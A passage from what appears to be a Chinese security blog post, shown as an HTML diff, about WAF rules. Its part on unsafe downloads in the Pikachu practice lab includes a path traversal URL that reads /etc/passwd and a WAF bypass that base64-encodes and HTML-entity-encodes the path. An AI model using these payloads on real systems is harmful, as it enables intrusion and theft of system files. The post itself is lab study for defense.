open&apos;,&apos;&apos;,&apos;active&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$PIKA_ROOT_DIR =  &quot;../../&quot;;</span><br><span class="line">include_once $PIKA_ROOT_DIR . &apos;header.php&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>该漏洞形成的原因是后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断，直接导致拼装精心构造的路径(比如../../../etc/passwd),可以将指定文件下载下来。</p>
+<p>首先进行构造下载路径：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.5.101/pikachu/vul/unsafedownload/execdownload.php?filename=/../../../../../../../../etc/passwd&amp;bigben.png</span><br></pre></td></tr></table></figure>
+
+<p>发现waf进行拦截：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509171653419.png" alt="image-20200509171653419"></p>
+<h5 id="3-2-1-WAF绕过"><a href="#3-2-1-WAF绕过" class="headerlink" title="3.2.1 WAF绕过"></a>3.2.1 WAF绕过</h5><p>对/../../../../../../../../etc/passwd&amp;bigben.png字段进行转码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//原来数据</span><br><span class="line">/../../../../../../../../etc/passwd&amp;bigben.png</span><br><span class="line">//base64转码</span><br><span class="line">Ly4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QmYmlnYmVuLnBuZw==</span><br><span class="line">//再进行一次HTML实体编码</span><br><span class="line">&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x32;&amp;#x56;&amp;#x30;&amp;#x59;&amp;#x79;&amp;#x39;&amp;#x77;&amp;#x59;&amp;#x58;&amp;#x4e;&amp;#x7a;&amp;#x64;&amp;#x32;&amp;#x51;&amp;#x6d;&amp;#x59;&amp;#x6d;&amp;#x6c;&amp;#x6e;&amp;#x59;&amp;#x6d;&amp;#x56;&amp;#x75;&amp;#x4c;&amp;#x6e;&amp;#x42;&amp;#x75;&amp;#x5a;&amp;#x77;&amp;#x3d;&amp;#x3d;</span><br></pre></td></tr></table></figure>
+
+<p>构造的url如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.5.101/pikachu/vul/unsafedownload/execdownload.php?filename=&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x79;&amp;#x34;&amp;#x75;&amp;#x4c;&amp;#x32;&amp;#x56;&amp;#x30;&amp;#x59;&amp;#x79;&amp;#x39;&amp;#x77;&amp;#x59;&amp;#x58;&amp;#x4e;&amp;#x7a;&amp;#x64;&amp;#x32;&amp;#x51;&amp;#x6d;&amp;#x59;&amp;#x6d;&amp;#x6c;&amp;#x6e;&amp;#x59;&amp;#x6d;&amp;#x56;&amp;#x75;&amp;#x4c;&amp;#x6e;&amp;#x42;&amp;#x75;&amp;#x5a;&amp;#x77;&amp;#x3d;&amp;#x3d;</span><br></pre></td></tr></table></figure>
+
+<p>未拦截并成功下载passwd文件：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509180947425.png" alt="image-20200509180947425"></p>
+<p>passwd内容：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200509181111376.png" alt="image-20200509181111376"></p>
+<p>修改规则进行拦截</p>
+<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu" target="_blank" rel="noopener">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
+
+      
+    </div>
+    
+    
+    
+
+
+<div>
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束 <i class="fa fa-heart"></i> 感谢阅读-------------</div>
+    
+</div>
+</div>
+ 
+
+    
+
+    
+
+    
+
+
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/29/WEB 安全之通用安全防御 WAF 系统搭建与学习/" rel="next" title="WEB 安全之通用安全防御 WAF 系统搭建与学习">
+                <i class="fa fa-chevron-left"></i> WEB 安全之通用安全防御 WAF 系统搭建与学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="SOHUCS"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="Darren-zl">
+            
+              <p class="site-author-name" itemprop="name">Darren-zl</p>
+              <p class="site-description motion-element" itemprop="description">一天一小步，随着时间的积累，你将会发现你其实已经走了很远。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Darren-zl" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/p/1005052390784733/home?from=page_100505&mod=TAB&pids=plc_main" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-安全之自定义-WAF-规则拦截常见攻击行为"><span class="nav-number">1.</span> <span class="nav-text">WEB 安全之自定义 WAF 规则拦截常见攻击行为</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-waf规则学习"><span class="nav-number">1.1.</span> <span class="nav-text">1.waf规则学习</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-漏洞测试"><span class="nav-number">1.2.</span> <span class="nav-text">2.漏洞测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-XSS漏洞测试"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 XSS漏洞测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-SSRF漏洞测试"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2  SSRF漏洞测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-文件上传漏洞"><span class="nav-number">1.2.3.</span> <span class="nav-text">2.3 文件上传漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4-SQL注入漏洞"><span class="nav-number">1.2.4.</span> <span class="nav-text">2.4 SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#测试无waf拦截状态："><span class="nav-number">1.2.4.0.1.</span> <span class="nav-text">测试无waf拦截状态：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#有waf拦截状态："><span class="nav-number">1.2.4.0.2.</span> <span class="nav-text">有waf拦截状态：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5-CC攻击"><span class="nav-number">1.2.5.</span> <span class="nav-text">2.5 CC攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-6-PHP反序列化漏洞"><span class="nav-number">1.2.6.</span> <span class="nav-text">2.6 PHP反序列化漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-7-xxe漏洞"><span class="nav-number">1.2.7.</span> <span class="nav-text">2.7 xxe漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-WAF绕过"><span class="nav-number">1.3.</span> <span class="nav-text">3.WAF绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-SQL注入绕过（代码如下）："><span class="nav-number">1.3.1.</span> <span class="nav-text">3.1 SQL注入绕过（代码如下）：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-1-1-在无waf的状态下，利用sqlmap进行注入内容如下："><span class="nav-number">1.3.1.1.</span> <span class="nav-text">3.1.1 在无waf的状态下，利用sqlmap进行注入内容如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-1-2-WAF绕过"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">3.1.2 WAF绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-不安全的文件下载绕过"><span class="nav-number">1.3.2.</span> <span class="nav-text">3.2  不安全的文件下载绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-1-WAF绕过"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">3.2.1 WAF绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考资料："><span class="nav-number">1.4.</span> <span class="nav-text">参考资料：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Darren-zl</span>
+
+  
+</div>
+
+
+  <!--<div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>-->
+
+
+
+ <!-- <span class="post-meta-divider">|</span>-->
+
+
+
+  <!--<div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>-->
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  <div class="bg_content">
+    <canvas id="canvas"></canvas>
+</div>
+
+
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+    <script type="text/javascript">
+    (function(){
+      var appid = 'cytxCyGhU';
+      var conf = '90b283bdb7ccb472f325f3c891156b33';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      if (width < 960) {
+      window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){
+        window.changyan.api.config({appid:appid,conf:conf})});
+      }
+    })();
+    </script>
+    <script type="text/javascript" src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+  
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("29xnQ1C2kcwORHYYn7xsWTnS-gzGzoHsz", "Rq1Gk75oRwH78BryWUL4oYzj");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+
+
+</body>
+</html>
